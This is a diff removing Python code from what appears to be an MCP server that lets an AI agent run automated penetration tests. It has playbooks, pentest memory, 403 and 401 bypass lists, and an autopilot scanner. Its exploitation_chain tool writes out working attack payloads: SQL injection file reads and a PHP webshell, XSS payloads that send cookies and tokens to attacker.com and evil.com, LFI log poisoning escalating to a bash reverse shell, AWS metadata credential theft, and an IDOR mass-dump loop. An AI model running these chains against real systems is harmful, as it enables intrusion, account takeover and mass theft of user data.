-                    "bucket": bucket, "url": gcs_url,
-                    "detail": f"Public GCS bucket: {bucket}"
-                })
-    
-    # Step 4: Test Azure Blob Storage
-    progress.update("Testing Azure Blob Storage")
-    if cloud_provider in ["auto", "azure"]:
-        for bucket in variants[:20]:
-            azure_url = f"https://{bucket}.blob.core.windows.net/?comp=list"
-            azure_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", azure_url]
-            result = run_command_advanced(azure_cmd, timeout=8, trace=trace)
-            status = result.get("stdout", "").strip()
-            
-            if status == "200":
-                findings.append({
-                    "type": "AZURE_BLOB_PUBLIC", "severity": "CRITICAL",
-                    "container": bucket, "url": azure_url,
-                    "detail": f"Public Azure Blob container: {bucket}"
-                })
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "domain": domain,
-        "variants_tested": len(variants[:30]),
-        "total_findings": len(findings),
-        "public_buckets": [f for f in findings if "PUBLIC" in f.get("type", "")],
-        "existing_buckets": [f for f in findings if "EXISTS" in f.get("type", "")],
-        "all_findings": findings,
-    }
-    
-    output = chain_engine.enrich_with_context("cloud_storage_enum", target, output)
-    log_tool_execution("cloud_storage_enum", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def exploitation_chain(
-    target: str,
-    chain_type: str = "auto",
-    timeout: int = 180
-) -> str:
-    """
-    Automatic exploitation chain builder. Analyzes prior tool results and builds
-    exploitation chains:
-    - SSRF + AWS metadata → credential extraction
-    - SQLi + file read → source code disclosure
-    - IDOR + API → mass data dump strategy
-    - XSS + CORS → session hijack chain
-    - LFI + log poisoning → RCE
-    Chain types: auto, ssrf_to_creds, sqli_to_rce, idor_to_dump, xss_to_takeover, lfi_to_rce
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("exploitation_chain", target, 6)
-    inputs = {"target": target, "chain_type": chain_type}
-    
-    # Step 1: Gather context from prior tool runs
-    progress.update("Gathering context from tool chain")
-    context = chain_engine.get_target_context(target) if hasattr(chain_engine, 'get_target_context') else {}
-    
-    # Analyze available data
-    has_ssrf = any("ssrf" in str(v).lower() for v in context.values()) if context else False
-    has_sqli = any("sqli" in str(v).lower() or "sql_injection" in str(v).lower() for v in context.values()) if context else False
-    has_idor = any("idor" in str(v).lower() for v in context.values()) if context else False
-    has_xss = any("xss" in str(v).lower() for v in context.values()) if context else False
-    has_lfi = any("lfi" in str(v).lower() for v in context.values()) if context else False
-    has_cors = any("cors" in str(v).lower() for v in context.values()) if context else False
-    
-    chains = []
-    
-    # Step 2: Build exploitation chains
-    progress.update("Building exploitation chains")
-    
-    if chain_type in ["auto", "ssrf_to_creds"] and (has_ssrf or chain_type == "ssrf_to_creds"):
-        chains.append({
-            "name": "SSRF → AWS Credential Extraction",
-            "severity": "CRITICAL",
-            "steps": [
-                {"step": 1, "action": "Confirm SSRF via enhanced_ssrf_scanner",
-                 "target": "Identified SSRF parameter"},
-                {"step": 2, "action": "Access http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                 "target": "AWS metadata service"},
-                {"step": 3, "action": "Extract AccessKeyId, SecretAccessKey, Token",
-                 "target": "IAM role credentials"},
-                {"step": 4, "action": "Use aws-cli with extracted credentials",
-                 "command": "aws sts get-caller-identity"},
-                {"step": 5, "action": "Enumerate S3, EC2, Lambda access",
-                 "command": "aws s3 ls / aws ec2 describe-instances"},
-            ],
-            "impact": "Full AWS account compromise via SSRF → IAM credential theft",
-            "prereqs": ["Confirmed SSRF vulnerability", "AWS infrastructure"],
-        })
-    
-    if chain_type in ["auto", "sqli_to_rce"] and (has_sqli or chain_type == "sqli_to_rce"):
-        chains.append({
-            "name": "SQLi → File Read → Source Disclosure → RCE",
-            "severity": "CRITICAL",
-            "steps": [
-                {"step": 1, "action": "Confirm SQLi via sqlmap_scan or sql_injection_test",
-                 "target": "Injectable parameter"},
-                {"step": 2, "action": "Read sensitive files via LOAD_FILE()",
-                 "payload": "' UNION SELECT LOAD_FILE('/etc/passwd')--"},
-                {"step": 3, "action": "Read application config for DB credentials",
-                 "payload": "' UNION SELECT LOAD_FILE('/var/www/html/.env')--"},
-                {"step": 4, "action": "Write webshell via INTO OUTFILE",
-                 "payload": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--"},
-                {"step": 5, "action": "Execute commands via webshell",
-                 "command": "curl target.com/shell.php?c=whoami"},
-            ],
-            "impact": "Full Remote Code Execution via SQL Injection chain",
-            "prereqs": ["Confirmed SQL injection", "FILE privilege on DB user"],
-        })
-    
-    if chain_type in ["auto", "idor_to_dump"] and (has_idor or chain_type == "idor_to_dump"):
-        chains.append({
-            "name": "IDOR → Mass Data Extraction",
-            "severity": "HIGH",
-            "steps": [
-                {"step": 1, "action": "Confirm IDOR via enhanced_idor_scanner",
-                 "target": "Vulnerable endpoint with sequential/predictable IDs"},
-                {"step": 2, "action": "Enumerate valid IDs (sequential, UUID patterns)",
-                 "detail": "Iterate through ID range: 1-10000"},
-                {"step": 3, "action": "Extract data for each valid ID",
-                 "command": "for i in $(seq 1 10000); do curl -s 'target.com/api/users/$i'; done"},
-                {"step": 4, "action": "Parse and aggregate extracted data",
-                 "detail": "Combine all responses into structured dataset"},
-                {"step": 5, "action": "Identify high-value targets (admin, PII)",
-                 "detail": "Filter for admin roles, emails, phone numbers"},
-            ],
-            "impact": "Mass data breach via IDOR - all user data accessible",
-            "prereqs": ["Confirmed IDOR vulnerability", "Predictable ID pattern"],
-        })
-    
-    if chain_type in ["auto", "xss_to_takeover"] and (has_xss or has_cors or chain_type == "xss_to_takeover"):
-        chains.append({
-            "name": "XSS + CORS → Account Takeover",
-            "severity": "CRITICAL",
-            "steps": [
-                {"step": 1, "action": "Confirm stored/reflected XSS",
-                 "target": "XSS injection point"},
-                {"step": 2, "action": "Craft credential-stealing payload",
-                 "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"},
-                {"step": 3, "action": "If CORS misconfigured, exploit cross-origin",
-                 "detail": "Host payload on attacker domain, steal authenticated API data"},
-                {"step": 4, "action": "Steal session tokens / JWT",
-                 "payload": "<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))</script>"},
-                {"step": 5, "action": "Replay stolen tokens for account takeover",
-                 "command": "curl -H 'Authorization: Bearer STOLEN_TOKEN' target.com/api/admin"},
-            ],
-            "impact": "Full account takeover via XSS → session theft → impersonation",
-            "prereqs": ["Confirmed XSS", "Session tokens in cookies/localStorage"],
-        })
-    
-    if chain_type in ["auto", "lfi_to_rce"] and (has_lfi or chain_type == "lfi_to_rce"):
-        chains.append({
-            "name": "LFI + Log Poisoning → RCE",
-            "severity": "CRITICAL",
-            "steps": [
-                {"step": 1, "action": "Confirm LFI via lfi_scan",
-                 "target": "File inclusion parameter"},
-                {"step": 2, "action": "Identify readable log files",
-                 "paths": ["/var/log/apache2/access.log", "/var/log/nginx/access.log"]},
-                {"step": 3, "action": "Poison log with PHP code via User-Agent",
-                 "command": "curl -A '<?php system($_GET[c]);?>' target.com"},
-                {"step": 4, "action": "Include poisoned log via LFI",
-                 "payload": "?file=../../../var/log/apache2/access.log&c=whoami"},
-                {"step": 5, "action": "Escalate to reverse shell",
-                 "command": "?file=../../../var/log/apache2/access.log&c=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"},
-            ],
-            "impact": "Remote Code Execution via LFI + log poisoning",
-            "prereqs": ["Confirmed LFI", "Readable log files", "PHP execution context"],
-        })
-    
-    # Step 3: Generate if no chains from context
-    if not chains:
-        progress.update("Generating default chains")
-        chains.append({
-            "name": "Recommended First Steps",
-            "severity": "INFO",
-            "steps": [
-                {"step": 1, "action": "Run target_profiler to identify stack"},
-                {"step": 2, "action": "Run context_fuzzer to discover endpoints"},
-                {"step": 3, "action": "Run smart_vulnerability_detector for quick wins"},
-                {"step": 4, "action": "Run specific scanners based on findings"},
-                {"step": 5, "action": "Re-run exploitation_chain with confirmed vulns"},
-            ],
-            "impact": "Need to discover vulnerabilities first",
-            "prereqs": ["Run reconnaissance tools first"],
-        })
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "chain_type": chain_type,
-        "chains_generated": len(chains),
-        "exploitation_chains": chains,
-        "context_available": {
-            "ssrf": has_ssrf, "sqli": has_sqli, "idor": has_idor,
-            "xss": has_xss, "lfi": has_lfi, "cors": has_cors,
-        },
-        "recommendation": "Execute chains in order of severity (CRITICAL first)",
-    }
-    
-    output = chain_engine.enrich_with_context("exploitation_chain", target, output)
-    log_tool_execution("exploitation_chain", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-
-# ============================================================================
-# MAIN ENTRY POINT
-# ============================================================================
-
-
-# ============================================================================
-# INTELLIGENT ORCHESTRATION ENGINE — Autonomous Pentest Brain
-# ============================================================================
-
-class PentestMemory:
-    """
-    Contextual memory system that retains findings across tool calls.
-    Enables intelligent decision-making based on accumulated knowledge.
-    """
-    
-    def __init__(self):
-        self._memory: Dict[str, Dict] = {}  # target → accumulated findings
-        self._decisions: List[Dict] = []  # decision log
-        self._rate_limits: Dict[str, Dict] = {}  # target → rate limit info
-    
-    def store_finding(self, target: str, tool: str, finding_type: str, data: Any):
-        """Store a finding for later cross-reference."""
-        if target not in self._memory:
-            self._memory[target] = {
-                "stack": {}, "ports": [], "services": [], "vulns": [],
-                "endpoints": [], "responses": {}, "headers": {},
-                "cloud": {}, "waf": None, "technologies": [],
-                "rate_limits": {}, "bypass_successes": [],
+            # CVSS-based severity from VulnCorrelator
+            results["severity_breakdown"] = correlation["by_severity"]
+            results["severity_breakdown"]["total"] = correlation["total_vulns"]
+            # Exploit chains and attack paths
+            results["exploit_chains"] = correlation["exploit_chains"]
+            results["recommended_attack_path"] = correlation["recommended_attack_path"]
+            results["risk_rating"] = correlation["risk_rating"]
+            results["attack_surface_score"] = correlation["attack_surface_score"]
+            # MITRE ATT&CK coverage
+            results["mitre_attack"] = {
+                "techniques_covered": correlation["mitre_coverage"],
+                "total_techniques": len(correlation["mitre_coverage"]),
             }
-        
-        mem = self._memory[target]
-        if finding_type == "port":
-            if data not in mem["ports"]:
-                mem["ports"].append(data)
-        elif finding_type == "service":
-            mem["services"].append(data)
-        elif finding_type == "vuln":
-            mem["vulns"].append({"tool": tool, "data": data, "timestamp": time.time()})
-        elif finding_type == "endpoint":
-            if data not in mem["endpoints"]:
-                mem["endpoints"].append(data)
-        elif finding_type == "response_code":
-            endpoint, code = data
-            mem["responses"][endpoint] = code
-        elif finding_type == "stack":
-            mem["stack"].update(data)
-        elif finding_type == "technology":
-            if data not in mem["technologies"]:
-                mem["technologies"].append(data)
-        elif finding_type == "cloud":
-            mem["cloud"].update(data)
-        elif finding_type == "waf":
-            mem["waf"] = data
-        elif finding_type == "header":
-            mem["headers"].update(data)
-        elif finding_type == "rate_limit":
-            mem["rate_limits"].update(data)
-        elif finding_type == "bypass_success":
-            mem["bypass_successes"].append(data)
-    
-    def get_context(self, target: str) -> Dict:
-        """Get full accumulated context for a target."""
-        return self._memory.get(target, {})
-    
-    def get_stack(self, target: str) -> Dict:
-        """Get detected technology stack."""
-        return self._memory.get(target, {}).get("stack", {})
-    
-    def get_vulns(self, target: str) -> List:
-        """Get all discovered vulnerabilities."""
-        return self._memory.get(target, {}).get("vulns", [])
-    
-    def has_finding(self, target: str, finding_type: str, keyword: str = "") -> bool:
-        """Check if a specific finding exists."""
-        mem = self._memory.get(target, {})
-        if finding_type == "waf":
-            return mem.get("waf") is not None
-        if finding_type == "cloud":
-            return bool(mem.get("cloud"))
-        data = mem.get(finding_type, [])
-        if keyword:
-            return any(keyword.lower() in str(item).lower() for item in data)
-        return bool(data)
-    
-    def decide(self, target: str, decision: str, reason: str):
-        """Log a strategic decision for audit trail."""
-        self._decisions.append({
-            "target": target, "decision": decision,
-            "reason": reason, "timestamp": time.time()
-        })
-    
-    def get_decisions(self, target: str) -> List[Dict]:
-        """Get decision trail for a target."""
-        return [d for d in self._decisions if d["target"] == target]
-
-
-class PlaybookEngine:
-    """
-    Pre-defined attack playbooks that auto-chain tools based on context.
-    Each playbook is a decision tree that adapts to findings.
-    """
-    
-    PLAYBOOKS = {
-        "web_full": {
-            "name": "Full Web Application Assessment",
-            "description": "Complete web pentest: recon → fingerprint → fuzz → inject → exploit",
-            "stages": [
-                {"name": "recon", "tools": ["nmap_scan", "web_tech_detect", "target_profiler"]},
-                {"name": "discovery", "tools": ["gobuster_scan", "enhanced_api_discovery", "subdomain_enum"]},
-                {"name": "analysis", "tools": ["enhanced_cors_scanner", "enhanced_waf_bypass", "header_security_audit"]},
-                {"name": "fuzzing", "tools": ["context_fuzzer", "smart_vulnerability_detector"]},
-                {"name": "injection", "tools": ["sql_injection_test", "xss_scan", "ssti_scanner", "ssrf_scanner"]},
-                {"name": "exploit", "tools": ["exploitation_chain"]},
-            ],
-        },
-        "api_assessment": {
-            "name": "API Security Assessment",
-            "description": "API-focused: discovery → auth testing → injection → IDOR → SSRF",
-            "stages": [
-                {"name": "discovery", "tools": ["enhanced_api_discovery", "target_profiler"]},
-                {"name": "auth", "tools": ["enhanced_jwt_analyzer", "enhanced_idor_scanner"]},
-                {"name": "injection", "tools": ["sql_injection_test", "command_injection_test"]},
-                {"name": "ssrf", "tools": ["enhanced_ssrf_scanner"]},
-                {"name": "exploit", "tools": ["exploitation_chain"]},
-            ],
-        },
-        "cloud_assessment": {
-            "name": "Cloud Infrastructure Assessment",
-            "description": "Cloud-focused: enum → storage → SSRF → metadata → takeover",
-            "stages": [
-                {"name": "recon", "tools": ["nmap_scan", "target_profiler"]},
-                {"name": "cloud_enum", "tools": ["cloud_storage_enum"]},
-                {"name": "ssrf", "tools": ["enhanced_ssrf_scanner"]},
-                {"name": "exploit", "tools": ["exploitation_chain"]},
-            ],
-        },
-        "network_internal": {
-            "name": "Internal Network Assessment",
-            "description": "Network pentest: discovery → services → SMB → exploit",
-            "stages": [
-                {"name": "discovery", "tools": ["advanced_arp_discovery", "nmap_scan"]},
-                {"name": "services", "tools": ["advanced_smb_enum"]},
-                {"name": "brute", "tools": ["hydra_attack"]},
-                {"name": "exploit", "tools": ["metasploit_exploit"]},
-            ],
-        },
-        "bug_bounty_quick": {
-            "name": "Bug Bounty Quick Assessment",
-            "description": "Fast bug bounty: subdomains → tech detect → CORS/SSRF/IDOR → report",
-            "stages": [
-                {"name": "scope", "tools": ["scope_check", "subdomain_enum"]},
-                {"name": "fingerprint", "tools": ["target_profiler", "web_tech_detect"]},
-                {"name": "vulns", "tools": ["enhanced_cors_scanner", "enhanced_ssrf_scanner", "enhanced_idor_scanner", "enhanced_jwt_analyzer"]},
-                {"name": "report", "tools": ["generate_report"]},
-            ],
-        },
-    }
-    
-    @classmethod
-    def get_playbook(cls, name: str) -> Dict:
-        """Get a playbook by name."""
-        return cls.PLAYBOOKS.get(name, {})
-    
-    @classmethod
-    def list_playbooks(cls) -> List[str]:
-        """List available playbooks."""
-        return list(cls.PLAYBOOKS.keys())
-    
-    @classmethod
-    def recommend_playbook(cls, context: Dict) -> str:
-        """Recommend a playbook based on current context."""
-        stack = context.get("stack", {})
-        ports = context.get("ports", [])
-        cloud = context.get("cloud", {})
-        
-        # Cloud detected → cloud assessment
-        if cloud.get("provider"):
-            return "cloud_assessment"
-        
-        # Only internal ports (445, 139, 3389) → network internal
-        internal_indicators = {445, 139, 3389, 22, 23, 3306, 5432}
-        if ports and all(p in internal_indicators for p in ports):
-            return "network_internal"
-        
-        # API detected → API assessment
-        if stack.get("api_type") or stack.get("framework") in ["fastapi", "express", "spring"]:
-            return "api_assessment"
-        
-        # Web ports → full web
-        if any(p in [80, 443, 8080, 8443] for p in ports):
-            return "web_full"
-        
-        return "bug_bounty_quick"
-
-
-class RateLimitDetector:
-    """
-    Detects rate limiting and adapts scan speed dynamically.
-    Monitors response patterns to identify throttling.
-    """
-    
-    def __init__(self):
-        self._limits: Dict[str, Dict] = {}
-        self._request_log: Dict[str, List[float]] = {}
-    
-    def log_request(self, target: str):
-        """Log a request timestamp."""
-        if target not in self._request_log:
-            self._request_log[target] = []
-        self._request_log[target].append(time.time())
-        # Keep last 100 timestamps
-        self._request_log[target] = self._request_log[target][-100:]
-    
-    def detect_from_response(self, target: str, status_code: int, headers: Dict) -> Dict:
-        """Analyze response for rate limit indicators."""
-        indicators = {
-            "rate_limited": False,
-            "limit": None,
-            "remaining": None,
-            "reset_time": None,
-            "retry_after": None,
-            "type": "unknown",
-        }
-        
-        # HTTP 429 → explicit rate limit
-        if status_code == 429:
-            indicators["rate_limited"] = True
-            indicators["type"] = "explicit_429"
-        
-        # Check rate limit headers
-        for key, val in headers.items():
-            key_lower = key.lower()
-            if "x-ratelimit-limit" in key_lower or "x-rate-limit-limit" in key_lower:
-                indicators["limit"] = int(val) if val.isdigit() else val
-            elif "x-ratelimit-remaining" in key_lower or "x-rate-limit-remaining" in key_lower:
-                indicators["remaining"] = int(val) if val.isdigit() else val
-            elif "x-ratelimit-reset" in key_lower or "x-rate-limit-reset" in key_lower:
-                indicators["reset_time"] = val
-            elif "retry-after" in key_lower:
-                indicators["retry_after"] = int(val) if val.isdigit() else val
-                indicators["rate_limited"] = True
-                indicators["type"] = "retry_after"
-        
-        # Cloudflare rate limit patterns
-        if status_code == 403 and any("cloudflare" in str(v).lower() for v in headers.values()):
-            indicators["rate_limited"] = True
-            indicators["type"] = "cloudflare_block"
-        
-        # AWS WAF rate limit (status 403 with specific headers)
-        if status_code == 403 and any("awselb" in str(v).lower() or "awsalb" in str(v).lower() for v in headers.values()):
-            indicators["rate_limited"] = True
-            indicators["type"] = "aws_waf"
-        
-        # Store findings
-        if indicators["rate_limited"] or indicators["limit"]:
-            self._limits[target] = indicators
-        
-        return indicators
-    
-    def get_recommended_delay(self, target: str) -> float:
-        """Get recommended delay between requests for a target."""
-        limit_info = self._limits.get(target, {})
-        
-        if limit_info.get("retry_after"):
-            return float(limit_info["retry_after"])
-        
-        if limit_info.get("type") == "cloudflare_block":
-            return 5.0  # Cloudflare needs longer cooldown
-        
-        if limit_info.get("type") == "aws_waf":
-            return 3.0
-        
-        if limit_info.get("limit"):
-            # Calculate safe request rate
-            limit = limit_info["limit"]
-            if isinstance(limit, int) and limit > 0:
-                return max(0.5, 60.0 / limit)  # Stay at 80% of limit
-        
-        # Default: adaptive based on response pattern
-        timestamps = self._request_log.get(target, [])
-        if len(timestamps) > 10:
-            # If requests are clustered, slow down
-            recent = timestamps[-10:]
-            time_span = recent[-1] - recent[0]
-            if time_span < 2.0:  # 10 requests in 2 seconds = too fast
-                return 1.0
-        
-        return 0.3  # Default moderate pace
-    
-    def is_rate_limited(self, target: str) -> bool:
-        """Check if target is currently rate limiting us."""
-        return self._limits.get(target, {}).get("rate_limited", False)
-    
-    def get_status(self, target: str) -> Dict:
-        """Get full rate limit status for a target."""
-        return {
-            "limits": self._limits.get(target, {}),
-            "total_requests": len(self._request_log.get(target, [])),
-            "recommended_delay": self.get_recommended_delay(target),
-            "is_limited": self.is_rate_limited(target),
-        }
-
-
-class IntelligentOrchestrator:
-    """
-    The brain of the MCP server. Makes autonomous decisions about:
-    - What to scan next based on findings
-    - How to adapt to rate limits and WAFs
-    - When to escalate from recon to exploitation
-    - Which payloads to use based on detected stack
-    """
-    
-    def __init__(self, memory: PentestMemory, rate_detector: RateLimitDetector):
-        self.memory = memory
-        self.rate_detector = rate_detector
-    
-    def analyze_response_code(self, target: str, endpoint: str, code: int) -> List[Dict]:
-        """
-        Contextual analysis of HTTP response codes.
-        Returns recommended follow-up actions.
-        """
-        actions = []
-        
-        if code == 405:
-            # Method Not Allowed → endpoint EXISTS but wrong method
-            actions.append({
-                "action": "method_enum",
-                "reason": f"{endpoint} returned 405 — endpoint exists, try alternate methods",
-                "methods": ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
-                "headers_to_try": [
-                    {"Content-Type": "application/json", "body": "{}"},
-                    {"Content-Type": "application/x-www-form-urlencoded"},
-                    {"Content-Type": "multipart/form-data"},
-                ],
-            })
-            self.memory.store_finding(target, "orchestrator", "endpoint", endpoint)
-        
-        elif code == 422:
-            # Unprocessable Entity → expects specific body format (common in Java/Spring/FastAPI)
-            actions.append({
-                "action": "body_fuzz",
-                "reason": f"{endpoint} returned 422 — expects structured body, fuzz parameters",
-                "payloads": [
-                    '{"username":"admin","password":"admin"}',
-                    '{"email":"test@test.com"}',
-                    '{"id":1}',
-                    '{"query":"test"}',
-                    '{"data":null}',
-                ],
-                "stack_hint": "Likely Spring Boot / FastAPI / NestJS",
-            })
-            self.memory.store_finding(target, "orchestrator", "stack", {"body_format": "json", "validation": "strict"})
-        
-        elif code == 403:
-            # Forbidden → try bypass techniques
-            actions.append({
-                "action": "bypass_403",
-                "reason": f"{endpoint} returned 403 — try bypass techniques",
-                "techniques": [
-                    {"header": "X-Original-URL", "value": endpoint},
-                    {"header": "X-Rewrite-URL", "value": endpoint},
-                    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
-                    {"header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
-                    {"path_mutation": endpoint + "/"},
-                    {"path_mutation": endpoint + "/..;/"},
-                    {"path_mutation": "/" + endpoint.strip("/").upper()},
-                    {"path_mutation": endpoint + "%20"},
-                    {"path_mutation": endpoint + "%0a"},
-                    {"path_mutation": endpoint + "?"},
-                    {"path_mutation": endpoint + "#"},
-                    {"path_mutation": endpoint + "..;"},
-                ],
-            })
-        
-        elif code == 401:
-            # Unauthorized → authentication required, try defaults + bypass
-            actions.append({
-                "action": "auth_bypass",
-                "reason": f"{endpoint} returned 401 — try default creds and auth bypass",
-                "techniques": [
-                    {"type": "basic_auth", "creds": ["admin:admin", "admin:password", "root:root"]},
-                    {"type": "jwt_none", "header": "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."},
-                    {"type": "header_bypass", "headers": ["X-API-Key: test", "Authorization: null"]},
-                ],
-            })
-        
-        elif code == 500:
-            # Internal Server Error → potential injection point
-            actions.append({
-                "action": "error_exploit",
-                "reason": f"{endpoint} returned 500 — server error, possible injection point",
-                "tests": ["sqli", "ssti", "command_injection", "deserialization"],
-            })
-        
-        elif code == 301 or code == 302:
-            # Redirect → follow and analyze destination
-            actions.append({
-                "action": "follow_redirect",
-                "reason": f"{endpoint} redirects — follow to discover hidden endpoints",
-            })
-        
-        return actions
-    
-    def recommend_next_tools(self, target: str) -> List[Dict]:
-        """
-        Based on accumulated memory, recommend next tools to run.
-        This is the core intelligence function.
-        """
-        context = self.memory.get_context(target)
-        if not context:
-            return [{"tool": "target_profiler", "reason": "No context yet — start with profiling"}]
-        
-        recommendations = []
-        stack = context.get("stack", {})
-        vulns = context.get("vulns", [])
-        waf = context.get("waf")
-        cloud = context.get("cloud", {})
-        endpoints = context.get("endpoints", [])
-        responses = context.get("responses", {})
-        
-        # If WAF detected but no bypass attempted
-        if waf and not context.get("bypass_successes"):
-            recommendations.append({
-                "tool": "enhanced_waf_bypass",
-                "reason": f"WAF detected ({waf}) but no bypass attempted",
-                "priority": "high",
-            })
-        
-        # If cloud provider detected but storage not enumerated
-        if cloud.get("provider") and not self.memory.has_finding(target, "vulns", "s3"):
-            recommendations.append({
-                "tool": "cloud_storage_enum",
-                "reason": f"Cloud provider {cloud.get('provider')} detected — enumerate storage",
-                "priority": "high",
-            })
-        
-        # If Java/Spring detected → test Spring-specific vulns
-        if stack.get("framework") in ["spring", "spring_boot"]:
-            if not self.memory.has_finding(target, "endpoints", "actuator"):
-                recommendations.append({
-                    "tool": "smart_vulnerability_detector",
-                    "reason": "Spring Boot detected — test /actuator, Log4Shell, deserial",
-                    "priority": "critical",
-                    "params": {"scan_type": "full"},
-                })
-        
-        # If 403s found but no bypass tested
-        forbidden_endpoints = [ep for ep, code in responses.items() if code == 403]
-        if forbidden_endpoints:
-            recommendations.append({
-                "tool": "context_fuzzer",
-                "reason": f"Found {len(forbidden_endpoints)} 403 endpoints — test bypass techniques",
-                "priority": "high",
-                "params": {"wordlist_type": "bypass"},
-            })
-        
-        # If vulns found but no exploitation chain built
-        if len(vulns) >= 2 and not self.memory.has_finding(target, "vulns", "chain"):
-            recommendations.append({
-                "tool": "exploitation_chain",
-                "reason": f"{len(vulns)} vulnerabilities found — build exploitation chain",
-                "priority": "critical",
-            })
-        
-        # If APIs discovered but not tested for IDOR
-        if endpoints and not self.memory.has_finding(target, "vulns", "idor"):
-            recommendations.append({
-                "tool": "enhanced_idor_scanner",
-                "reason": "API endpoints discovered — test for IDOR",
-                "priority": "medium",
-            })
-        
-        # If no SSRF test done yet
-        if not self.memory.has_finding(target, "vulns", "ssrf"):
-            recommendations.append({
-                "tool": "enhanced_ssrf_scanner",
-                "reason": "SSRF not yet tested — critical for cloud environments",
-                "priority": "medium",
-            })
-        
-        # Sort by priority
-        priority_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
-        recommendations.sort(key=lambda x: priority_order.get(x.get("priority", "low"), 3))
-        
-        return recommendations[:5]  # Top 5 recommendations
-    
-    def adapt_to_stack(self, target: str) -> Dict:
-        """
-        Adapt testing strategy based on detected technology stack.
-        Returns stack-specific configuration.
-        """
-        stack = self.memory.get_stack(target)
-        config = {
-            "wordlists": [],
-            "payloads": [],
-            "priority_tests": [],
-            "skip_tests": [],
-        }
-        
-        framework = stack.get("framework", "").lower()
-        language = stack.get("language", "").lower()
-        cloud_provider = self.memory.get_context(target).get("cloud", {}).get("provider", "")
-        
-        if "spring" in framework or "java" in language:
-            config["wordlists"].extend([
-                "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
-                "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
-                "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
-                "/h2-console", "/jolokia", "/heapdump",
-            ])
-            config["payloads"].extend(["log4shell", "java_deserial", "spring_spel"])
-            config["priority_tests"].extend(["ssti_scanner", "command_injection_test"])
-        
-        elif "go" in language or "golang" in framework:
-            config["wordlists"].extend([
-                "/debug/pprof/", "/debug/vars", "/metrics",
-                "/healthz", "/readyz", "/livez",
-                "/swagger/", "/api-docs/",
-            ])
-            config["payloads"].extend(["ssti_golang", "path_traversal"])
-            config["priority_tests"].extend(["ssti_scanner", "lfi_scan"])
-        
-        elif "node" in language or "express" in framework:
-            config["wordlists"].extend([
-                "/.env", "/package.json", "/node_modules/.package-lock.json",
-                "/graphql", "/__graphql", "/playground",
-                "/server.js", "/app.js", "/config.js",
-            ])
-            config["payloads"].extend(["nosql_injection", "prototype_pollution", "ssrf"])
-            config["priority_tests"].extend(["ssrf_scanner", "command_injection_test"])
-        
-        elif "python" in language or "django" in framework or "flask" in framework or "fastapi" in framework:
-            config["wordlists"].extend([
-                "/admin/", "/api/schema/", "/__debug__/", "/docs", "/redoc",
-                "/openapi.json", "/.env", "/settings.py",
-                "/manage.py", "/requirements.txt",
-            ])
-            config["payloads"].extend(["ssti_jinja2", "python_deserial", "ssrf"])
-            config["priority_tests"].extend(["ssti_scanner", "ssrf_scanner"])
-        
-        elif "php" in language or "laravel" in framework or "wordpress" in framework:
-            config["wordlists"].extend([
-                "/wp-admin/", "/wp-config.php.bak", "/.env",
-                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-                "/debug/default/view", "/telescope/requests",
-            ])
-            config["payloads"].extend(["php_object_injection", "lfi", "rce_php"])
-            config["priority_tests"].extend(["lfi_scan", "command_injection_test"])
-        
-        # Cloud-specific
-        if cloud_provider == "aws":
-            config["wordlists"].extend([
-                "/.aws/credentials", "/.aws/config",
-                "/latest/meta-data/", "/latest/user-data",
-            ])
-            config["priority_tests"].append("enhanced_ssrf_scanner")
-        elif cloud_provider == "gcp":
-            config["wordlists"].extend([
-                "/computeMetadata/v1/", "/computeMetadata/v1/project/",
-            ])
-        elif cloud_provider == "azure":
-            config["wordlists"].extend([
-                "/metadata/instance", "/.azure/",
-            ])
-        
-        return config
-
-
-# Initialize global intelligence instances
-pentest_memory = PentestMemory()
-rate_limit_detector = RateLimitDetector()
-orchestrator = IntelligentOrchestrator(pentest_memory, rate_limit_detector)
-
-
-# --- Intelligent Tools ---
-
-@mcp.tool()
-@resolve_references
-async def autopilot_scan(
-    target: str,
-    playbook: str = "auto",
-    max_stages: int = 4,
-    respect_rate_limits: bool = True,
-    timeout: int = 600
-) -> str:
-    """
-    AUTONOMOUS pentest orchestration. Runs an intelligent attack sequence
-    adapted to the target in real-time. Uses playbooks + memory + rate-limit
-    detection to chain tools optimally.
-    
-    Playbooks: auto, web_full, api_assessment, cloud_assessment, network_internal, bug_bounty_quick
-    The 'auto' mode profiles the target first and selects the best playbook.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 600)
-    trace, progress, exec_dir = _init_tool_context("autopilot_scan", target, max_stages * 3)
-    
-    results = {
-        "target": target,
-        "playbook_used": playbook,
-        "stages_completed": [],
-        "findings": [],
-        "recommendations": [],
-        "decisions": [],
-        "rate_limit_status": {},
-    }
-    
-    try:
-        # Step 1: Initial profiling to select playbook
-        progress.update("Phase 1: Target profiling")
-        trace.command(f"autopilot_scan target={target} playbook={playbook}")
-        
-        # Quick HTTP fingerprint for playbook selection
-        import urllib.request, urllib.error
-        profile_data = {"ports": [], "stack": {}, "cloud": {}}
-        
-        try:
-            test_url = target if target.startswith("http") else f"https://{target}"
-            req = urllib.request.Request(test_url, method="GET")
-            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            with urllib.request.urlopen(req, timeout=10) as resp:
